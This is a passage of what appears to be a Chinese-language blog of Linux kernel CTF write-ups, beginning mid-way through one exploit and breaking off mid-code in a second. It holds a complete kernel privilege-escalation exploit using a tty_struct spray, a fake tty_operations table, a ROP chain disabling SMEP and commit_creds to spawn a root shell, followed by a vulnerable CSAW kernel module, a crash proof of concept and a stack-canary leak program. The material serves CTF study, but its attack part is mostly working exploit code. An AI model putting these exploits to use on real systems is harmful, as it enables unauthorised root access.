class="number">78.u</span>nsigned <span class="keyword">long</span> native_write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>;</span><br><span class="line"><span class="number">79.u</span>nsigned <span class="keyword">long</span> xchgeaxesp = <span class="number">0xFFFFFFFF81007808</span>;</span><br><span class="line"><span class="number">80.u</span>nsigned <span class="keyword">long</span> poprdiret = <span class="number">0xFFFFFFFF813E7D6F</span>;</span><br><span class="line"><span class="number">81.</span><span class="comment">//unsigned long iretq = 0xFFFFFFFF8181A797;</span></span><br><span class="line"><span class="number">82.u</span>nsigned <span class="keyword">long</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="number">83.u</span>nsigned <span class="keyword">long</span> swapgs = <span class="number">0xFFFFFFFF81063694</span>;</span><br><span class="line"><span class="number">84.</span></span><br><span class="line"><span class="number">85.</span><span class="comment">/* status */</span></span><br><span class="line"><span class="number">86.u</span>nsigned <span class="keyword">long</span> user_cs, user_ss, user_eflags;</span><br><span class="line"><span class="number">87.</span><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">88.</span> <span class="keyword">asm</span>(</span><br><span class="line"><span class="number">89.</span> <span class="string">"movq %%cs, %0n"</span></span><br><span class="line"><span class="number">90.</span> <span class="string">"movq %%ss, %1n"</span></span><br><span class="line"><span class="number">91.</span> <span class="string">"pushfqn"</span></span><br><span class="line"><span class="number">92.</span> <span class="string">"popq %2n"</span></span><br><span class="line"><span class="number">93.</span> :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags)</span><br><span class="line"><span class="number">94.</span> :</span><br><span class="line"><span class="number">95.</span> : <span class="string">"memory"</span></span><br><span class="line"><span class="number">96.</span> );</span><br><span class="line"><span class="number">97.</span>&#125;</span><br><span class="line"><span class="number">98.</span></span><br><span class="line"><span class="number">99.</span><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">100.</span> <span class="comment">// char *shell_str = "/bin/sh";</span></span><br><span class="line"><span class="number">101.</span> <span class="comment">// char *args[] = &#123;shell_str, NULL&#125;;</span></span><br><span class="line"><span class="number">102.</span> <span class="comment">// execve(shell_str, args, NULL);</span></span><br><span class="line"><span class="number">103.</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="number">104.</span>&#125;</span><br><span class="line"><span class="number">105.</span></span><br><span class="line"><span class="number">106.</span><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">107.</span> commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"><span class="number">108.</span>&#125;</span><br><span class="line"><span class="number">109.</span></span><br><span class="line"><span class="number">110.</span><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">111.</span> <span class="keyword">char</span> *buf = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="number">112.</span> <span class="keyword">char</span> *fake_file_operations = (<span class="keyword">char</span>*) <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>); <span class="comment">// big enough to be file_operations</span></span><br><span class="line"><span class="number">113.</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> = (<span class="title">struct</span> <span class="title">tty_operations</span> *) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">tty_operations</span>));</span></span><br><span class="line"><span class="number">114.</span> </span><br><span class="line"><span class="number">115.</span> save_stats();</span><br><span class="line"><span class="number">116.</span> </span><br><span class="line"><span class="number">117.</span> <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line"><span class="number">118.</span> fake_tty_operations-&gt;proc_fops = &amp;fake_file_operations;</span><br><span class="line"><span class="number">119.</span> fake_tty_operations-&gt;ioctl = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)xchgeaxesp;</span><br><span class="line"><span class="number">120.</span> </span><br><span class="line"><span class="number">121.</span> <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="number">122.</span> <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="number">123.</span> <span class="keyword">int</span> fd;</span><br><span class="line"><span class="number">124.</span> <span class="comment">//ioctl(fd2, 0x10001, 0xa8); // the same'11 as cred struct size</span></span><br><span class="line"><span class="number">125.</span> ioctl(fd2, <span class="number">0x10001</span>, TTY_STRUCT_SIZE);</span><br><span class="line"><span class="number">126.</span> write(fd2, <span class="string">"hello world"</span>, <span class="built_in">strlen</span>(<span class="string">"hello world"</span>));</span><br><span class="line"><span class="number">127.</span> close(fd1);</span><br><span class="line"><span class="number">128.</span> fd = fd2;</span><br><span class="line"><span class="number">129.</span> </span><br><span class="line"><span class="number">130.</span> <span class="comment">// spray tty</span></span><br><span class="line"><span class="number">131.</span> <span class="built_in">puts</span>(<span class="string">"[+] Spraying buffer with tty_struct"</span>);</span><br><span class="line"><span class="number">132.</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line"><span class="number">133.</span> spray_fd[i] = open(<span class="string">"/dev/ptmx"</span>, O_RDWR | O_NOCTTY); </span><br><span class="line"><span class="number">134.</span> <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">135.</span> perror(<span class="string">"open tty"</span>);</span><br><span class="line"><span class="number">136.</span> &#125;</span><br><span class="line"><span class="number">137.</span> &#125;</span><br><span class="line"><span class="number">138.</span> </span><br><span class="line"><span class="number">139.</span> <span class="comment">// now we have a tty_struct in our buffer</span></span><br><span class="line"><span class="number">140.</span> <span class="built_in">puts</span>(<span class="string">"[+] Reading buffer content from kernel buffer"</span>);</span><br><span class="line"><span class="number">141.</span> <span class="keyword">long</span> size = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="number">142.</span>  <span class="keyword">if</span> (size &lt; <span class="number">32</span>) &#123;</span><br><span class="line"><span class="number">143.</span> <span class="built_in">puts</span>(<span class="string">"[-] Reading not complete!"</span>);</span><br><span class="line"><span class="number">144.</span> <span class="built_in">printf</span>(<span class="string">"[-] Only %ld bytes read.n"</span>, size);</span><br><span class="line"><span class="number">145.</span> &#125;</span><br><span class="line"><span class="number">146.</span> <span class="built_in">puts</span>(<span class="string">"[+] Detecting buffer content type"</span>);</span><br><span class="line"><span class="number">147.</span> <span class="keyword">if</span> (buf[<span class="number">0</span>] != <span class="number">0x01</span> || buf[<span class="number">1</span>] != <span class="number">0x54</span>) &#123;</span><br><span class="line"><span class="number">148.</span> <span class="built_in">puts</span>(<span class="string">"[-] tty_struct spray failed"</span>);</span><br><span class="line"><span class="number">149.</span> <span class="built_in">printf</span>(<span class="string">"[-] We should have 0x01 and 0x54, instead we got %02x %02xn"</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>]);</span><br><span class="line"><span class="number">150.</span> <span class="built_in">puts</span>(<span class="string">"[-] Exiting..."</span>);</span><br><span class="line"><span class="number">151.</span> <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"><span class="number">152.</span> &#125;</span><br><span class="line"><span class="number">153.</span> </span><br><span class="line"><span class="number">154.</span> <span class="built_in">puts</span>(<span class="string">"[+] Spray complete. Modifying function pointer"</span>);</span><br><span class="line"><span class="number">155.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">24</span>];</span><br><span class="line"><span class="number">156.</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fake_tty_operations;</span><br><span class="line"><span class="number">157.</span> </span><br><span class="line"><span class="number">158.</span> <span class="built_in">puts</span>(<span class="string">"[+] Preparing ROP chain"</span>);</span><br><span class="line"><span class="number">159.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> lower_address = xchgeaxesp &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"><span class="number">160.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> base = lower_address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line"><span class="number">161.</span> <span class="built_in">printf</span>(<span class="string">"[+] Base address is %lxn"</span>, base);</span><br><span class="line"><span class="number">162.</span> <span class="keyword">if</span> (mmap(base, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) != base) &#123;</span><br><span class="line"><span class="number">163.</span>  perror(<span class="string">"mmap"</span>);</span><br><span class="line"><span class="number">164.</span> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="number">165.</span> &#125;</span><br><span class="line"><span class="number">166.</span> </span><br><span class="line"><span class="number">167.</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line"><span class="number">168.</span> poprdiret,</span><br><span class="line"><span class="number">169.</span> <span class="number">0x6f0</span>,</span><br><span class="line"><span class="number">170.</span> native_write_cr4,</span><br><span class="line"><span class="number">171.</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shellcode,</span><br><span class="line"><span class="number">172.</span> swapgs,</span><br><span class="line"><span class="number">173.</span> base,</span><br><span class="line"><span class="number">174.</span> iretq,</span><br><span class="line"><span class="number">175.</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell,</span><br><span class="line"><span class="number">176.</span> user_cs,</span><br><span class="line"><span class="number">177.</span> user_eflags,</span><br><span class="line"><span class="number">178.</span> base + <span class="number">0x10000</span>,</span><br><span class="line"><span class="number">179.</span> user_ss</span><br><span class="line"><span class="number">180.</span> &#125;;</span><br><span class="line"><span class="number">181.</span> <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)lower_address, rop_chain, <span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line"><span class="number">182.</span> </span><br><span class="line"><span class="number">183.</span> <span class="built_in">puts</span>(<span class="string">"[+] Writing function pointer to the driver"</span>);</span><br><span class="line"><span class="number">184.</span> <span class="keyword">long</span> len = write(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="number">185.</span> <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">186.</span> perror(<span class="string">"write"</span>);</span><br><span class="line"><span class="number">187.</span> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="number">188.</span> &#125;</span><br><span class="line"><span class="number">189.</span> </span><br><span class="line"><span class="number">190.</span> <span class="built_in">puts</span>(<span class="string">"[+] Triggering"</span>);</span><br><span class="line"><span class="number">191.</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="number">192.</span> ioctl(spray_fd[i], <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//FFFFFFFF814D8AED call rax</span></span><br><span class="line"><span class="number">193.</span> &#125;</span><br><span class="line"><span class="number">194.</span> </span><br><span class="line"><span class="number">195.</span>&#125;</span><br><span class="line"><span class="number">196.</span></span><br><span class="line"><span class="number">197.</span><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">198.</span> exploit();</span><br><span class="line"><span class="number">199.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">200.</span>&#125;</span><br></pre></td></tr></table></figure>
<pre><code>其中，tty_struct和tty_operations都是从源码里找到的结构，不太需要解释，file_operations的存在主要是给他一个有效的指针，避免一些可能出现的错误，然后save_state函数用来保存用户空间的cs、eflags、ss的值，在iretq的时候，需要提供rip，cs,eflags,用户栈位置，ss值，所以我们要提前保存好备用。
通过打开/dev/ptmx设备，我们就新建了tty_struct。
通过计算tty_struct的大小，提前使用ioctl将buf的大小设置为一样的大小，之后新建tty_struct的时候,tty_struct就会落在这个buf里。
之后我们通过修改tty_struct的tty_operations，设置为我们自己的tty_operations即可，我们自己的tty_operations再修改ioctl为xchg esp, eax来使得rsp指向用户空间。
而这里的位置我们提前mmap，放入rop_chain的内容，这样xchg之后rsp就指向了rop_chain开始的位置，进入了rop流程啦，最后rop结束，执行完毕，打开了root shell，提权成功！
</code></pre><p>第二道</p>
<h1 id="0x01-漏洞代码"><a href="#0x01-漏洞代码" class="headerlink" title="0x01 :漏洞代码"></a>0x01 :漏洞代码</h1><p>有漏洞的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * csaw.c</span></span><br><span class="line"><span class="comment"> * CSAW CTF Challenge Kernel Module</span></span><br><span class="line"><span class="comment"> * Jon Oberheide &lt;jon@oberheide.org&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This module implements the /proc/csaw interface which can be read</span></span><br><span class="line"><span class="comment"> * and written like a normal file. For example:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * $ cat /proc/csaw </span></span><br><span class="line"><span class="comment"> * Welcome to the CSAW CTF challenge. Best of luck!</span></span><br><span class="line"><span class="comment"> * $ echo "Hello World" &gt; /proc/csaw</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Jon Oberheide"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"CSAW CTF Challenge Kernel Module"</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">csaw_proc</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct proc_dir_entry &#123;</span></span><br><span class="line"><span class="comment">    unsigned short low_ino;</span></span><br><span class="line"><span class="comment">    unsigned short namelen;</span></span><br><span class="line"><span class="comment">    const char *name;</span></span><br><span class="line"><span class="comment">    mode_t mode;</span></span><br><span class="line"><span class="comment">    nlink_t nlink;</span></span><br><span class="line"><span class="comment">    uid_t uid;</span></span><br><span class="line"><span class="comment">    gid_t gid;</span></span><br><span class="line"><span class="comment">    unsigned long size;</span></span><br><span class="line"><span class="comment">    struct inode_operations * proc_iops;</span></span><br><span class="line"><span class="comment">    struct file_operations * proc_fops;</span></span><br><span class="line"><span class="comment">    get_info_t *get_info;</span></span><br><span class="line"><span class="comment">    struct module *owner;</span></span><br><span class="line"><span class="comment">    struct proc_dir_entry *next, *parent, *subdir;</span></span><br><span class="line"><span class="comment">    void *data;</span></span><br><span class="line"><span class="comment">    read_proc_t *read_proc;</span></span><br><span class="line"><span class="comment">    write_proc_t *write_proc;</span></span><br><span class="line"><span class="comment">    atomic_t count;      //use count </span></span><br><span class="line"><span class="comment">    int deleted;        //delete flag</span></span><br><span class="line"><span class="comment">    kdev_t    rdev;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_write(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_writen"</span>);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * We should be safe to perform this copy from userspace since our </span></span><br><span class="line"><span class="comment">     * kernel is compiled with CC_STACKPROTECTOR, which includes a canary</span></span><br><span class="line"><span class="comment">     * on the kernel stack to protect against smashing the stack.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * While the user could easily DoS the kernel, I don't think they</span></span><br><span class="line"><span class="comment">     * should be able to escalate privileges without discovering the </span></span><br><span class="line"><span class="comment">     * secret stack canary value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"csaw: error copying data from userspacen"</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">csaw_read(<span class="keyword">char</span> *page, <span class="keyword">char</span> **start, <span class="keyword">off_t</span> off, <span class="keyword">int</span> count, <span class="keyword">int</span> *eof, <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: called csaw_readn"</span>);</span><br><span class="line">    *eof = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"Welcome to the CSAW CTF challenge. Best of luck!n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, buf + off, MAX_LENGTH);</span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __init</span><br><span class="line">csaw_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: loading modulen"</span>);</span><br><span class="line">    csaw_proc = create_proc_entry(<span class="string">"csaw"</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    csaw_proc-&gt;read_proc = csaw_read;</span><br><span class="line">    csaw_proc-&gt;write_proc = csaw_write;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: created /proc/csaw entryn"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit</span><br><span class="line">csaw_exit(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (csaw_proc) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">"csaw"</span>, csaw_proc);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">"csaw: unloading modulen"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(csaw_init);</span><br><span class="line">module_exit(csaw_exit);</span><br></pre></td></tr></table></figure></p>
<p>Makefile如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">obj-m := csaw.o  </span><br><span class="line">KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/</span><br><span class="line">PWD := $(shell pwd)  </span><br><span class="line">modules:  </span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules  </span><br><span class="line">moduels_install:  </span><br><span class="line">        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  </span><br><span class="line">clean:  </span><br><span class="line">        rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></p>
<h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h1><p>首先漏洞点很好找，就是一个简单粗暴的栈溢出：</p>
<pre><code>这里，从用户空间做拷贝的时候未作任何check，
导致过长的字符串可以覆盖到返回地值，
这种情形和我们第二篇文章中遇到的情况一样，
那么是不是就按照那个文章做利用就可以了呢？
并不是，从注释中看出，出题者是开启了kernel CANARY选项的，
也就是说，我们直接去覆盖的话，
会先覆盖CANARY，然后就会过不了check从而kernel panic。
是不是这就没法玩了呢？一般来说，对于CANARY这种情况，
我们采取的策略要么是leak，要么就是crack。继续分析代码，看到read部分：


拼接了栈上一个变量，然后拷贝到了用户空间，
而且拷贝的长度很长，这就是出题人故意留下的info leak，
好让我们可以leak CANARY的值。
那么现在，我们拥有一个info leak，拥有一个stack     bof，两者结合，就是第二篇文章中的利用方式了。只需要组合payload为：
junk+CANARY+ebp+payload_addr
我们就可以像之前一样去get root shell啦~
</code></pre><h1 id="0x03-Poc"><a href="#0x03-Poc" class="headerlink" title="0x03 : Poc"></a>0x03 : Poc</h1><p>poc的代码很简单，直接触发漏洞就可以，但是这种直接就kernel panic的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    write(fd,poc,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面我们写一个dump，可以dump出CANARY的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">   <span class="comment">// memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span 